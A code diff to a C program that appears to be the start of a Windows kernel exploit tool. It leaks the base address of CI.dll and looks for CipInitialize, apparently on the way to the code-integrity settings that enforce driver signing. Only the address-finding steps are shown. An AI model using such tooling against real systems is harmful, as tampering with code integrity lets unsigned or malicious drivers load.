@@ -12,23 +12,18 @@
 
 int main(int argc, char **argv)
 {
-  LPVOID CiImagepMem   = NULL;
-  LPVOID CiImageBase   = NULL;
-  DWORD  CiOptionsLen  = 0;
+  LPVOID CiImagepMem   = 0;
+  LPVOID CiImageBase   = 0;
+  LPVOID CipInitBase   = 0;
+  DWORD  CiImageLen    = 0;
 
-  CiImageBase = KeGetBase("CI.dll", &CiOptionsLen);
+  CiImageBase = KeGetBase("CI.dll", &CiImageLen);
   if ( (CiImageBase != NULL) )
   {
-    /*!
-     * Next, we dump the PE into the new buffer
-     * we control. We parse that buffer to look
-     * for CI!g_CiOptions.
-    !*/
-    printf("[*] Dumping %p from memory.\n", CiImageBase);
-
-    if ( GetCiOptions(CiImageBase) != NULL )
+    printf("[+] Leaked CI @ %p\n", CiImageBase);
+    if ( (CipInitBase = GetCipInit(CiImageBase)) != NULL )
     {
-	    printf("[+] CiInitialize found\n");
+	    printf("[+] CipInitialize @ %p\n", CipInitBase);
     };
   };
 };
